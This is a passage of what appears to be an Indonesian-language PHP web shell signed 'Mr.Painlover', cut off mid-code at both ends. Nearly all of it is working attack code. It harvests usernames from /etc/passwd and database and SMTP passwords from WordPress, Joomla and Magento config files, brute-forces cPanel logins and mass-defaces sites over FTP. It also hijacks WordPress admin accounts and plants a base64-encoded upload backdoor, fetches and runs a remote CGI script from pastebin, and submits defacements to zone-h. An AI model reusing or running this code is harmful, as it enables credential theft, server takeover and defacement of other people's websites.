            $passcp = explode("\r\n", $_POST['pass_cp']);
            $i = 0;
            foreach($usercp as $ucp) {
                foreach($passcp as $pcp) {
                    if(@mysql_connect('localhost', $ucp, $pcp)) {
                        if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                        } else {
                            $_SESSION[$ucp] = "1";
                            $_SESSION[$pcp] = "1";
                            if($ucp == '' || $pcp == '') {
                               
                            } else {
                                $i++;
                                if(function_exists('posix_getpwuid')) {
                                    $domain_cp = file_get_contents("/etc/named.conf"); 
                                    if($domain_cp == '') {
                                        $dom =  "<font color=red>gabisa ambil nama domain nya</font>";
                                    } else {
                                        preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                        foreach($domains_cp[1] as $dj) {
                                            $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                            $user_cp_url = $user_cp_url['name'];
                                            if($user_cp_url == $ucp) {
                                                $dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
                                                break;
                                            }
                                        }
                                    }
                                } else {
                                    $dom = "<font color=red>function is Disable by system</font>";
                                }
                                echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
                            }
                        }
                    }
                }
            }
            if($i == 0) {
            } else {
                echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Mr.Painlover.</font>";
            }
        } else {
            echo "<center>
            <form method='post'>
            USER: <br>
            <textarea style='width: 450px; height: 150px;' name='user_cp'>";
            $_usercp = fopen("/etc/passwd","r");
            while($getu = fgets($_usercp)) {
                if($getu == '' || !$_usercp) {
                    echo "<font color=red>Can't read /etc/passwd</font>";
                } else {
                    preg_match_all("/(.*?):x:/", $getu, $u);
                    foreach($u[1] as $user_cp) {
                            if(is_dir("/home/$user_cp/public_html")) {
                                echo "$user_cp\n";
                        }
                    }
                }
            }
            echo "</textarea><br>
            PASS: <br>
            <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
            function cp_pass($dir) {
                $pass = "";
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    if(!is_file("$dir/$dirb")) continue;
                    $ambil = file_get_contents("$dir/$dirb");
                    if(preg_match("/WordPress/", $ambil)) {
                        $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                    } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                        $pass .= ambilkata($ambil,"password = '","'")."\n";
                    } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                        $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                    } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                        $pass .= ambilkata($ambil,'password = "','"')."\n";
                    } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                        $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                    } elseif(preg_match("/^[client]$/", $ambil)) {
                        preg_match("/password=(.*?)/", $ambil, $pass1);
                        if(preg_match('/"/', $pass1[1])) {
                            $pass1[1] = str_replace('"', "", $pass1[1]);
                            $pass .= $pass1[1]."\n";
                        } else {
                            $pass .= $pass1[1]."\n";
                        }
                    } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                        $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                    }
                }
                echo $pass;
            }
            $cp_pass = cp_pass($dir);
            echo $cp_pass;
            echo "</textarea><br>
            <input type='submit' name='crack' style='width: 450px;' value='Crack'>
            </form>
            <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
        }
    } elseif($_GET['do'] == 'cpftp_auto') {
        if($_POST['crack']) {
            $usercp = explode("\r\n", $_POST['user_cp']);
            $passcp = explode("\r\n", $_POST['pass_cp']);
            $i = 0;
            foreach($usercp as $ucp) {
                foreach($passcp as $pcp) {
                    if(@mysql_connect('localhost', $ucp, $pcp)) {
                        if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                        } else {
                            $_SESSION[$ucp] = "1";
                            $_SESSION[$pcp] = "1";
                            if($ucp == '' || $pcp == '') {
                                //
                            } else {
                                echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
                                $ftp_conn = ftp_connect($ip);
                                $ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
                                if((!$ftp_login) || (!$ftp_conn)) {
                                    echo "[+] <font color=red>Login Gagal</font><br><br>";
                                } else {
                                    echo "[+] <font color=lime>Login Sukses</font><br>";
                                    $fi = htmlspecialchars($_POST['file_deface']);
                                    $deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
                                    if($deface) {
                                        $i++;
                                        echo "[+] <font color=lime>Deface Sukses</font><br>";
                                        if(function_exists('posix_getpwuid')) {
                                            $domain_cp = file_get_contents("/etc/named.conf"); 
                                            if($domain_cp == '') {
                                                echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                            } else {
                                                preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                                foreach($domains_cp[1] as $dj) {
                                                    $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                                    $user_cp_url = $user_cp_url['name'];
                                                    if($user_cp_url == $ucp) {
                                                        echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
                                                        break;
                                                    }
                                                }
                                            }
                                        } else {
                                            echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                        }
                                    } else {
                                        echo "[-] <font color=red>Deface Gagal</font><br><br>";
                                    }
                                }
                                //echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
                            }
                        }
                    }
                }
            }
            if($i == 0) {
            } else {
                echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Mr.Painlover.</font>";
            }
        } else {
            echo "<center>
            <form method='post'>
            Filename: <br>
            <input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
            Deface Page: <br>
            <input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
            USER: <br>
            <textarea style='width: 450px; height: 150px;' name='user_cp'>";
            $_usercp = fopen("/etc/passwd","r");
            while($getu = fgets($_usercp)) {
                if($getu == '' || !$_usercp) {
                    echo "<font color=red>Can't read /etc/passwd</font>";
                } else {
                    preg_match_all("/(.*?):x:/", $getu, $u);
                    foreach($u[1] as $user_cp) {
                            if(is_dir("/home/$user_cp/public_html")) {
                                echo "$user_cp\n";
                        }
                    }
                }
            }
            echo "</textarea><br>
            PASS: <br>
            <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
            function cp_pass($dir) {
                $pass = "";
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    if(!is_file("$dir/$dirb")) continue;
                    $ambil = file_get_contents("$dir/$dirb");
                    if(preg_match("/WordPress/", $ambil)) {
                        $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                    } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                        $pass .= ambilkata($ambil,"password = '","'")."\n";
                    } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                        $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                    } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                        $pass .= ambilkata($ambil,'password = "','"')."\n";
                    } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                        $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                    } elseif(preg_match("/client/", $ambil)) {
                        preg_match("/password=(.*)/", $ambil, $pass1);
                        if(preg_match('/"/', $pass1[1])) {
                            $pass1[1] = str_replace('"', "", $pass1[1]);
                            $pass .= $pass1[1]."\n";
                        }
                    } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                        $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                    }
                }
                echo $pass;
            }
            $cp_pass = cp_pass($dir);
            echo $cp_pass;
            echo "</textarea><br>
            <input type='submit' name='crack' style='width: 450px;' value='Hajar'>
            </form>
            <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
        }
    } elseif($_GET['do'] == 'smtp') {
        echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
        function scj($dir) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                $ambil = str_replace("$", "", $ambil);
                if(preg_match("/JConfig|joomla/", $ambil)) {
                    $smtp_host = ambilkata($ambil,"smtphost = '","'");
                    $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
                    $smtp_user = ambilkata($ambil,"smtpuser = '","'");
                    $smtp_pass = ambilkata($ambil,"smtppass = '","'");
                    $smtp_port = ambilkata($ambil,"smtpport = '","'");
                    $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
                    echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
                    echo "SMTP port: <font color=lime>$smtp_port</font><br>";
                    echo "SMTP user: <font color=lime>$smtp_user</font><br>";
                    echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
                    echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
                    echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
                }
            }
        }
        $smpt_hunter = scj($dir);
        echo $smpt_hunter;
    } elseif($_GET['do'] == 'auto_wp') {
        if($_POST['hajar']) {
            $title = htmlspecialchars($_POST['new_title']);
            $pn_title = str_replace(" ", "-", $title);
            if($_POST['cek_edit'] == "Y") {
                $script = $_POST['edit_content'];
            } else {
                $script = $title;
            }
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/WordPress/", $config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."posts";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                    $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                    echo "<div style='margin: 5px auto;'>";
                    if($target == '') {
                        echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                    } else {
                        echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                    } else {
                        echo "<font color=lime>sukses di ganti.</font><br>";
                    }
                    echo "</div>";
                    mysql_close($conn);
                }
            }
        } else {
            echo "<center>
            <h1>Auto Edit Title+Content WordPress</h1>
            <form method='post'>
            DIR Config: <br>
            <input type='text' size='50' name='config_dir' value='$dir'><br><br>
            Set Title: <br>
            <input type='text' name='new_title' value='Hacked by Mr.Painlover' placeholder='New Title'><br><br>
            Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
            <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
            <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
            <input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
            </form>
            <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
            ";
        }
    } elseif($_GET['do'] == 'zoneh') {
        if($_POST['submit']) {
            $domain = explode("\r\n", $_POST['url']);
            $nick =  $_POST['nick'];
            echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
            echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
            function zoneh($url,$nick) {
                $ch = curl_init("http://www.zone-h.com/notify/single");
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                      curl_setopt($ch, CURLOPT_POST, true);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
                return curl_exec($ch);
                      curl_close($ch);
            }
            foreach($domain as $url) {
                $zoneh = zoneh($url,$nick);
                if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                    echo "$url -> <font color=lime>OK</font><br>";
                } else {
                    echo "$url -> <font color=red>ERROR</font><br>";
                }
            }
        } else {
            echo "<center><form method='post'>
            <u>Defacer</u>: <br>
            <input type='text' name='nick' size='50' value='Mr.Painlover'><br>
            <u>Domains</u>: <br>
            <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
            <input type='submit' name='submit' value='Submit' style='width: 450px;'>
            </form>";
        }
        echo "</center>";
    } elseif($_GET['do'] == 'cgi') {
        $cgi_dir = mkdir('pain_cgi', 0755);
        $file_cgi = "pain_cgi/cgi.izo";
        $isi_htcgi = "AddHandler cgi-script .izo";
        $htcgi = fopen(".htaccess", "w");
        fwrite($htcgi, $isi_htcgi);
        fclose($htcgi);
        $cgi_script = getsource("http://pastebin.com/raw/Lj46KxFT");
        $cgi = fopen($file_cgi, "w");
        fwrite($cgi, $cgi_script);
        fclose($cgi);
        chmod($file_cgi, 0755);
        echo "<iframe src='pain_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
    } elseif($_GET['do'] == 'fake_root') {
        ob_start();
        $cwd = getcwd();
        $ambil_user = explode("/", $cwd);
        $user = $ambil_user[2];
        if($_POST['reverse']) {
            $site = explode("\r\n", $_POST['url']);
            $file = $_POST['file'];
            foreach($site as $url) {
                $cek = getsource("$url/~$user/$file");
                if(preg_match("/hacked/i", $cek)) {
                    echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
                }
            }
        } else {
            echo "<center><form method='post'>
            Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
            User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
            Domain: <br>
            <textarea style='width: 450px; height: 250px;' name='url'>";
            reverse($_SERVER['HTTP_HOST']);
            echo "</textarea><br>
            <input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
            </form><br>
            NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
        }
    } elseif($_GET['do'] == 'adminer') {
        $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
        function adminer($url, $isi) {
            $fp = fopen($isi, "w");
            $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, $url);
                  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                  curl_setopt($ch, CURLOPT_FILE, $fp);
            return curl_exec($ch);
                  curl_close($ch);
            fclose($fp);
            ob_flush();
            flush();
        }
        if(file_exists('adminer.php')) {
            echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
            if(adminer("https://raw.githubusercontent.com/ibnudz/adminer/master/adminer.php","adminer.php")) {
                echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
            } else {
                echo "<center><font color=red>gagal buat file adminer</font></center>";
            }
        }
    } elseif($_GET['do'] == 'auto_dwp') {
        if($_POST['auto_deface_wp']) {
            function anucurl($sites) {
                $ch = curl_init($sites);
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data = curl_exec($ch);
                      curl_close($ch);
                return $data;
            }
            function lohgin($cek, $web, $userr, $pass, $wp_submit) {
                $post = array(
                       "log" => "$userr",
                       "pwd" => "$pass",
                       "rememberme" => "forever",
                       "wp-submit" => "$wp_submit",
                       "redirect_to" => "$web",
                       "testcookie" => "1",
                       );
                $ch = curl_init($cek);
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_POST, 1);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data = curl_exec($ch);
                      curl_close($ch);
                return $data;
            }
            $scan = $_POST['link_config'];
            $link_config = scandir($scan);
            $script = htmlspecialchars($_POST['script']);
            $user = "painlover";
            $pass = "painlover";
            $passx = md5($pass);
            foreach($link_config as $dir_config) {
                if(!is_file("$scan/$dir_config")) continue;
                $config = file_get_contents("$scan/$dir_config");
                if(preg_match("/WordPress/", $config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {                
                        echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "[+] $target <br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                    if(!$conn OR !$db OR !$update) {
                        echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                        mysql_close($conn);
                    } else {
                        $site = "$target/wp-login.php";
                        $site2 = "$target/wp-admin/theme-install.php?upload";
                        $b1 = anucurl($site2);
                        $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                        $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                        $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                        $upload3 = base64_decode("PD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                        $www = "m.php";
                        $fp5 = fopen($www,"w");
                        fputs($fp5,$upload3);
                        $post2 = array(
                                "_wpnonce" => "$anu2",
                                "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                                "themezip" => "@$www",
                                "install-theme-submit" => "Install Now",
                                );
                        $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                              curl_setopt($ch, CURLOPT_POST, 1);
                              curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                              curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                              curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                              curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                        $data3 = curl_exec($ch);
                              curl_close($ch);
                        $y = date("Y");
                        $m = date("m");
                        $namafile = "id.php";
                        $fpi = fopen($namafile,"w");
                        fputs($fpi,$script);
                        $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                               curl_setopt($ch6, CURLOPT_POST, true);
                               curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                               curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                               curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                               curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                               curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
                        $postResult = curl_exec($ch6);
                               curl_close($ch6);
                        $as = "$target/k.php";
                        $bs = anucurl($as);
                        if(preg_match("#$script#is", $bs)) {
                            echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                            echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                            } else {
                            echo "[-] <font color='red'>gagal mepes...</font><br>";
                            echo "[!!] coba aja manual: <br>";
                            echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                            echo "[+] username: <font color=lime>$user</font><br>";
                            echo "[+] password: <font color=lime>$pass</font><br><br>";    
                            }
                        mysql_close($conn);
                    }
                }
            }
        } else {
            echo "<center><h1>WordPress Auto Deface</h1>
            <form method='post'>
            <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
            <input type='text' name='script' height='10' size='50' placeholder='Hacked by Mr.Painlover' required><br>
            <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
            </form>
            <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
            </center>";
        }
    } elseif($_GET['do'] == 'auto_dwp2') {
        if($_POST['auto_deface_wp']) {
            function anucurl($sites) {
                $ch = curl_init($sites);
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION,true);
                $data = curl_exec($ch);
                      curl_close($ch);
                return $data;
            }
            function lohgin($cek, $web, $userr, $pass, $wp_submit) {
                $post = array(
                       "log" => "$userr",
                       "pwd" => "$pass",
                       "rememberme" => "forever",
                       "wp-submit" => "$wp_submit",
                       "redirect_to" => "$web",
                       "testcookie" => "1",
                       );
                $ch = curl_init($cek);
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_POST, 1);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data = curl_exec($ch);
                      curl_close($ch);
                return $data;
            }
            $link = explode("\r\n", $_POST['link']);
            $script = htmlspecialchars($_POST['script']);
            $user = "painlover";
            $pass = "painlover";
            $passx = md5($pass);
            foreach($link as $dir_config) {
                $config = anucurl($dir_config);
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."users";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                if($target == '') {                
                    echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                } else {
                    echo "[+] $target <br>";
                }
                $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                if(!$conn OR !$db OR !$update) {
                    echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                    mysql_close($conn);
                } else {
                    $site = "$target/wp-login.php";
                    $site2 = "$target/wp-admin/theme-install.php?upload";
                    $b1 = anucurl($site2);
                    $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                    $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                    $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                    $upload3 = base64_decode("PD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                    $www = "m.php";
                    $fp5 = fopen($www,"w");
                    fputs($fp5,$upload3);
                    $post2 = array(
                            "_wpnonce" => "$anu2",
                            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                            "themezip" => "@$www",
                            "install-theme-submit" => "Install Now",
                            );
                    $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          curl_setopt($ch, CURLOPT_POST, 1);
                          curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                    $data3 = curl_exec($ch);
                          curl_close($ch);
                    $y = date("Y");
                    $m = date("m");
                    $namafile = "id.php";
                    $fpi = fopen($namafile,"w");
                    fputs($fpi,$script);
                    $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                           curl_setopt($ch6, CURLOPT_POST, true);
                           curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                           curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                           curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                           curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                           curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
                    $postResult = curl_exec($ch6);
                           curl_close($ch6);
                    $as = "$target/k.php";
                    $bs = anucurl($as);
